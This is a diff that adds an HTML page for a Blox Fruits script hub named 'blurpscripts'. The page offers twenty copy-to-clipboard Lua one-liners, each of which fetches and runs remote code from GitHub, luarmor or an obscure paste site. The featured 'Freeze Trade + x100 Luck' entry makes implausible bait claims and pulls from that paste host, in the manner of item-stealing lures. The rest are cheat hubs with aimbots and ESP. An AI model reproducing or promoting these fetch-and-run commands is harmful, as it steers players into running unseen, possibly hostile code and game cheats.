@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>blurpscripts — Blox Fruits Script Hub</title>
+  <style>
+    :root {
+      --bg-primary: #07080f;
+      --bg-secondary: #0d101d;
+      --bg-card: #121629;
+      --bg-card-hover: #171c34;
+      --neon-cyan: #00f3ff;
+      --neon-purple: #b537f2;
+      --neon-pink: #ff2a85;
+      --neon-orange: #ff7b00;
+      --neon-green: #00ff88;
+      --text-primary: #f1f5f9;
+      --text-secondary: #94a3b8;
+      --border-color: rgba(0, 243, 255, 0.18);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      background-image:
+        radial-gradient(circle at 15% 15%, rgba(181, 55, 242, 0.12), transparent 35%),
+        radial-gradient(circle at 85% 20%, rgba(0, 243, 255, 0.12), transparent 35%),
+        linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
+    }
+
+    header {
+      border-bottom: 1px solid var(--border-color);
+      background: rgba(7, 8, 15, 0.85);
+      backdrop-filter: blur(12px);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      padding: 1rem 1.5rem;
+    }
+
+    .nav-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    .logo {
+      font-size: 1.75rem;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+      background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 25px rgba(0, 243, 255, 0.35);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .logo span.tag {
+      font-size: 0.7rem;
+      font-weight: 700;
+      padding: 0.2rem 0.55rem;
+      border-radius: 999px;
+      background: rgba(0, 243, 255, 0.12);
+      border: 1px solid var(--neon-cyan);
+      -webkit-text-fill-color: var(--neon-cyan);
+      letter-spacing: 1px;
+    }
+
+    .status-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.85rem;
+      color: var(--neon-green);
+      background: rgba(0, 255, 136, 0.08);
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      padding: 0.4rem 0.85rem;
+      border-radius: 999px;
+    }
+
+    .pulse-dot {
+      width: 8px;
+      height: 8px;
+      background: var(--neon-green);
+      border-radius: 50%;
+      box-shadow: 0 0 10px var(--neon-green);
+      animation: pulse 1.6s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(1.25); }
+    }
+
+    main {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 4rem;
+    }
+
+    .hero {
+      text-align: center;
+      margin-bottom: 2.25rem;
+    }
+
+    .hero h1 {
+      font-size: clamp(2rem, 4vw, 3rem);
+      font-weight: 800;
+      margin-bottom: 0.6rem;
+    }
+
+    .hero p {
+      color: var(--text-secondary);
+      max-width: 620px;
+      margin: 0 auto;
+      font-size: 1rem;
+    }
+
+    /* Featured Card */
+    .featured-wrapper {
+      margin-bottom: 2.5rem;
+      position: relative;
+      border-radius: 16px;
+      padding: 2px;
+      background: linear-gradient(135deg, var(--neon-orange), var(--neon-pink), var(--neon-cyan));
+      box-shadow: 0 0 35px rgba(255, 42, 133, 0.25);
+    }
+
+    .featured-card {
+      background: linear-gradient(145deg, #151226, #0d1122);
+      border-radius: 14px;
+      padding: 1.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .featured-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+    }
+
+    .hot-badge {
+      background: linear-gradient(90deg, #ff5100, #ff006a);
+      color: #fff;
+      font-weight: 800;
+      font-size: 0.8rem;
+      padding: 0.35rem 0.85rem;
+      border-radius: 999px;
+      letter-spacing: 0.8px;
+      box-shadow: 0 0 15px rgba(255, 81, 0, 0.5);
+    }
+
+    .featured-title {
+      font-size: 1.55rem;
+      font-weight: 800;
+      color: #fff;
+    }
+
+    .featured-desc {
+      color: #cbd5e1;
+      font-size: 0.95rem;
+      line-height: 1.5;
+    }
+
+    /* Controls */
+    .controls {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .search-box {
+      position: relative;
+      width: 100%;
+    }
+
+    .search-box input {
+      width: 100%;
+      padding: 0.95rem 1.25rem;
+      border-radius: 12px;
+      border: 1px solid var(--border-color);
+      background: var(--bg-secondary);
+      color: var(--text-primary);
+      font-size: 1rem;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    .search-box input:focus {
+      border-color: var(--neon-cyan);
+      box-shadow: 0 0 18px rgba(0, 243, 255, 0.2);
+    }
+
+    .filters {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.6rem;
+    }
+
+    .filter-btn {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      color: var(--text-secondary);
+      padding: 0.5rem 1rem;
+      border-radius: 999px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .filter-btn:hover,
+    .filter-btn.active {
+      background: rgba(0, 243, 255, 0.14);
+      border-color: var(--neon-cyan);
+      color: var(--neon-cyan);
+      box-shadow: 0 0 12px rgba(0, 243, 255, 0.2);
+    }
+
+    /* Grid */
+    .scripts-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 1.25rem;
+    }
+
+    .script-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 14px;
+      padding: 1.35rem;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      gap: 1rem;
+      transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .script-card:hover {
+      transform: translateY(-4px);
+      background: var(--bg-card-hover);
+      border-color: var(--neon-cyan);
+      box-shadow: 0 8px 25px rgba(0, 243, 255, 0.12);
+    }
+
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 0.5rem;
+    }
+
+    .card-title {
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .card-tag {
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 0.25rem 0.6rem;
+      border-radius: 6px;
+      background: rgba(181, 55, 242, 0.16);
+      border: 1px solid rgba(181, 55, 242, 0.45);
+      color: #e0aaff;
+      white-space: nowrap;
+    }
+
+    .card-tag.nokey {
+      background: rgba(0, 255, 136, 0.12);
+      border-color: rgba(0, 255, 136, 0.4);
+      color: var(--neon-green);
+    }
+
+    .card-desc {
+      color: var(--text-secondary);
+      font-size: 0.88rem;
+      line-height: 1.45;
+    }
+
+    .code-preview {
+      background: #060811;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 0.65rem 0.8rem;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 0.78rem;
+      color: var(--neon-cyan);
+      overflow-x: auto;
+      white-space: nowrap;
+    }
+
+    .copy-btn {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: none;
+      border-radius: 10px;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      background: linear-gradient(90deg, var(--neon-cyan), #3b82f6);
+      color: #040711;
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.45rem;
+    }
+
+    .copy-btn:hover {
+      filter: brightness(1.1);
+      box-shadow: 0 0 18px rgba(0, 243, 255, 0.4);
+    }
+
+    .featured-card .copy-btn {
+      background: linear-gradient(90deg, var(--neon-orange), var(--neon-pink));
+      color: #fff;
+      font-size: 1rem;
+      padding: 0.9rem;
+    }
+
+    .featured-card .copy-btn:hover {
+      box-shadow: 0 0 22px rgba(255, 42, 133, 0.5);
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      bottom: 1.75rem;
+      right: 1.75rem;
+      background: #0f172a;
+      border: 1px solid var(--neon-green);
+      color: var(--neon-green);
+      padding: 0.85rem 1.35rem;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 0.92rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6), 0 0 15px rgba(0, 255, 136, 0.25);
+      transform: translateY(120%);
+      opacity: 0;
+      transition: 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 999;
+    }
+
+    .toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 1rem;
+      border-top: 1px solid var(--border-color);
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="nav-container">
+      <div class="logo">blurpscripts <span class="tag">V3.0</span></div>
+      <div class="status-badge">
+        <span class="pulse-dot"></span>
+        20 Verified Scripts Online
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <h1>Blox Fruits Script Hub</h1>
+      <p>Instant one-click copy for the latest Blox Fruits hubs, auto-farms, raid carries, and exclusive trade utilities.</p>
+    </section>
+
+    <!-- Top Featured Script -->
+    <section class="featured-wrapper">
+      <div class="featured-card">
+        <div class="featured-header">
+          <span class="hot-badge">HOT 🔥 FEATURED</span>
+          <span class="card-tag nokey">No Key • Patched Bypass</span>
+        </div>
+        <div class="featured-title">Freeze Trade + x100 Luck Zioles Roll</div>
+        <p class="featured-desc">
+          Lock trade windows to prevent last-second fruit swaps and boost Zioles Gacha roll odds by x100 for Mythical fruits (Kitsune, Dragon, Leopard, Dough).
+        </p>
+        <div class="code-preview" id="featured-code">loadstring(game:HttpGet("https://paste.fe4r.click/raw/0334f1d7-74c6-46aa-aa71-c1c6ef1f1c55"))()</div>
+        <button class="copy-btn" onclick="copyScript(`loadstring(game:HttpGet(&quot;https://paste.fe4r.click/raw/0334f1d7-74c6-46aa-aa71-c1c6ef1f1c55&quot;))()`, 'Freeze Trade + x100 Luck Zioles Roll')">
+          Copy Featured Script
+        </button>
+      </div>
+    </section>
+
+    <!-- Search & Filter -->
+    <section class="controls">
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="Search 20 scripts (e.g., Redz Hub, Freeze Trade, Auto Farm, No Key)..." onkeyup="filterScripts()" />
+      </div>
+      <div class="filters">
+        <button class="filter-btn active" data-filter="all" onclick="setFilter('all', this)">All Scripts (20)</button>
+        <button class="filter-btn" data-filter="hot" onclick="setFilter('hot', this)">HOT 🔥</button>
+        <button class="filter-btn" data-filter="nokey" onclick="setFilter('nokey', this)">No Key</button>
+        <button class="filter-btn" data-filter="autofarm" onclick="setFilter('autofarm', this)">Auto Farm</button>
+        <button class="filter-btn" data-filter="pvp" onclick="setFilter('pvp', this)">PvP & Bounty</button>
+        <button class="filter-btn" data-filter="sea" onclick="setFilter('sea', this)">Sea Events & Raids</button>
+      </div>
+    </section>
+
+    <!-- Scripts Grid -->
+    <section class="scripts-grid" id="scriptsGrid"></section>
+  </main>
+
+  <footer>
+    blurpscripts &copy; 2026 — Updated Daily for Blox Fruits Update 24+
+  </footer>
+
+  <div class="toast" id="toast">Copied to clipboard!</div>
+
+  <script>
+    const scripts = [
+      {
+        name: "Freeze Trade + x100 Luck Zioles Roll",
+        category: ["hot", "nokey"],
+        badge: "HOT 🔥 • No Key",
+        nokey: true,
+        desc: "Combined anti-scam trade freezer and x100 Zioles Gacha mythical roll booster.",
+        code: 'loadstring(game:HttpGet("https://paste.fe4r.click/raw/0334f1d7-74c6-46aa-aa71-c1c6ef1f1c55"))()'
+      },
+      {
+        name: "Redz Hub",
+        category: ["hot", "nokey", "autofarm", "sea"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Smooth max-level auto farm, auto CDK/Soul Guitar, Mirage Island finder, and Leviathan hunter.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()'
+      },
+      {
+        name: "Hoho Hub",
+        category: ["autofarm", "pvp", "sea"],
+        badge: "Key System",
+        nokey: false,
+        desc: "All-in-one Blox Fruits suite with fast mastery farm, auto raid carry, and bounty hunt aimbot.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()'
+      },
+      {
+        name: "W-Azure True V2",
+        category: ["hot", "nokey", "autofarm", "pvp"],
+        badge: "No Key",
+        nokey: true,
+        desc: "High-speed auto farm, V4 race trials helper, and customizable PvP silent aim.",
+        code: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()'
+      },
+      {
+        name: "Speed Hub X",
+        category: ["nokey", "autofarm", "sea"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Lightweight keyless script optimized for mobile executors with instant quest teleport.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()'
+      },
+      {
+        name: "Banana Cat Hub",
+        category: ["autofarm", "sea"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Specialized in Third Sea grinding, Dragon Dojo belts, Terror Shark farming, and Sea Events.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()'
+      },
+      {
+        name: "Mukuro Hub",
+        category: ["autofarm", "pvp"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Classic reliable hub featuring auto bone farm, Katakuri V2 spawn, and fruit sniper.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/xDepressionx/Free-Script/main/BloxFruit.lua"))()'
+      },
+      {
+        name: "Min Gaming Hub",
+        category: ["nokey", "autofarm"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Fast leveling script with zero key required, auto stats, and safe-mode tweening.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/JonnyCheeser/bloxfruits/main/minhub"))()'
+      },
+      {
+        name: "Alchemy Hub",
+        category: ["hot", "autofarm", "pvp"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Clean modern UI with auto mastery, fruit notifier ESP, and instant raid completion.",
+        code: 'loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()'
+      },
+      {
+        name: "Vector Hub",
+        category: ["nokey", "autofarm", "sea"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Great for Kitsune Shrine farming, Azure Embers collection, and auto sea beasts.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/AAwful/Vector_Hub/0/v2"))()'
+      },
+      {
+        name: "Raito Hub",
+        category: ["nokey", "autofarm"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Zero-lag farming hub built for low-end mobile devices and fast chest collection.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/main/Script"))()'
+      },
+      {
+        name: "Matsune Hub",
+        category: ["nokey", "autofarm", "sea"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Auto Shark Anchor, Tushita & Yama puzzles, and automated Law raid farming.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/matssunehub.lua"))()'
+      },
+      {
+        name: "Cokka Hub",
+        category: ["autofarm", "pvp"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Includes auto bounty hunter, auto dodge observation haki, and fast attack aura.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()'
+      },
+      {
+        name: "Blacktrap Hub",
+        category: ["autofarm", "sea"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Multi-game hub with full Blox Fruits auto-progression from First to Third Sea.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/S4nZz/bt_project/main/loader.lua"))()'
+      },
+      {
+        name: "Zen Hub",
+        category: ["autofarm", "pvp"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Feature-rich script with devil fruit sniper, server hopper, and auto factory raid.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader"))()'
+      },
+      {
+        name: "Mama Hub",
+        category: ["nokey", "autofarm"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Simple one-tap auto farm with built-in anti-AFK and auto fruit storage.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/MAMAhub1/Mmahub/main/README.md"))()'
+      },
+      {
+        name: "Neva Hub",
+        category: ["autofarm", "sea"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Automated elite hunter, auto Haki color dealer finder, and Legendary Sword buyer.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2"))()'
+      },
+      {
+        name: "Ripper Hub",
+        category: ["pvp", "autofarm"],
+        badge: "Key System",
+        nokey: false,
+        desc: "Focused on PvP combos, ESP players/fruits, and fast melee/sword mastery.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/NEWBF.lua"))()'
+      },
+      {
+        name: "Aurora Hub",
+        category: ["nokey", "autofarm"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Clean keyless script for auto boss farming, material grinding, and auto rebirth.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaCrack/Min/refs/heads/main/MinXt2Eng"))()'
+      },
+      {
+        name: "Sonic Hub",
+        category: ["nokey", "autofarm", "sea"],
+        badge: "No Key",
+        nokey: true,
+        desc: "Ultra-fast tween speed farm with auto-awakening raids and Mirage gear ESP.",
+        code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/NickelHUBB/SonicTuru/main/Protected-25.lua"))()'
+      }
+    ];
+
+    let currentFilter = 'all';
+
+    function renderScripts() {
+      const grid = document.getElementById('scriptsGrid');
+      const search = document.getElementById('searchInput').value.toLowerCase();
+      grid.innerHTML = '';
+
+      const filtered = scripts.filter(s => {
+        const matchesFilter = currentFilter === 'all' || s.category.includes(currentFilter);
+        const matchesSearch =
+          s.name.toLowerCase().includes(search) ||
+          s.desc.toLowerCase().includes(search) ||
+          s.badge.toLowerCase().includes(search);
+        return matchesFilter && matchesSearch;
+      });
+
+      filtered.forEach(script => {
+        const card = document.createElement('div');
+        card.className = 'script-card';
+        card.innerHTML = `
+          <div>
+            <div class="card-top">
+              <div class="card-title">${script.name}</div>
+              <span class="card-tag ${script.nokey ? 'nokey' : ''}">${script.badge}</span>
+            </div>
+            <p class="card-desc" style="margin-top: 0.6rem;">${script.desc}</p>
+          </div>
+          <div>
+            <div class="code-preview" style="margin-bottom: 0.75rem;">${script.code}</div>
+            <button class="copy-btn" onclick='copyScript(${JSON.stringify(script.code)}, ${JSON.stringify(script.name)})'>
+              Copy Script
+            </button>
+          </div>
+        `;
+        grid.appendChild(card);
+      });
+    }
+
+    function setFilter(filter, btn) {
+      currentFilter = filter;
+      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      renderScripts();
+    }
+
+    function filterScripts() {
+      renderScripts();
+    }
+
+    function copyScript(code, name) {
+      navigator.clipboard.writeText(code).then(() => {
+        showToast(`Copied "${name}"!`);
+      }).catch(() => {
+        const temp = document.createElement('textarea');
+        temp.value = code;
+        document.body.appendChild(temp);
+        temp.select();
+        document.execCommand('copy');
+        document.body.removeChild(temp);
+        showToast(`Copied "${name}"!`);
+      });
+    }
+
+    let toastTimeout;
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      toast.textContent = msg;
+      toast.classList.add('show');
+      clearTimeout(toastTimeout);
+      toastTimeout = setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2400);
+    }
+
+    renderScripts();
+  </script>
+</body>
+</html>
